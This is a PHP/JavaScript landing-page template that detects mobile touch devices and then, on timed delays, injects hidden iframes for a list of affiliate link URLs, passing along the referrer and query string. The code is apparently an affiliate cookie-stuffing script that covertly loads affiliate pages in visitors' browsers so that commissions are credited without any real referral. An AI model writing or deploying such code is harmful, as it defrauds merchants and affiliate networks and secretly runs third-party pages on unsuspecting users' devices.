<script type="text/javascript">
    function getReferrerDomain()
    {
        var topDomain = '';

        try
        {
            topDomain = window.top.location.href;
        }
        catch(e) { }

        if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
        {
            topDomain = document.referrer;
        }

        return topDomain;
    };

    (function () {
        var packageName = 'landing';
        if (!window[packageName]) {
            window[packageName] = {};
        };
        var tool = {
            ismobile: function () {
                if (!(/(<?php echo $allowed_platforms?>)/i.test(window.navigator.platform)))
                {
                    return false;
                }
                if (!(('ontouchstart' in window) || (navigator.MaxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0))) {
                    return false;
                }
                return true;
            },
            add: function (url) {
                var el = document.createElement('iframe');
                el.src = (url.indexOf('?') !== -1?url + '&':url + '?')+'referrer=' + encodeURIComponent(getReferrerDomain()) + '&' + location.search.substring(1);
                el.style.display = "none";
                /*allow-top-navigation*/
                el.setAttribute("sandbox"," allow-popups allow-scripts allow-same-origin");
                document.body.appendChild(el);
            },
        };
        window[packageName]['tool'] = tool;
    })();
    if (landing.tool.ismobile()) {
        <?php $cookieIndex=0;?>
        <?php foreach($affiliate_link_url_list as $url):?>
        setTimeout(function() {landing.tool.add('<?php echo $url;?>')},<?php echo ($cookieIndex*$interval + $delay)*1000;?>);
        <?php $cookieIndex+=1;?>
        <?php endforeach;?>
    }
</script>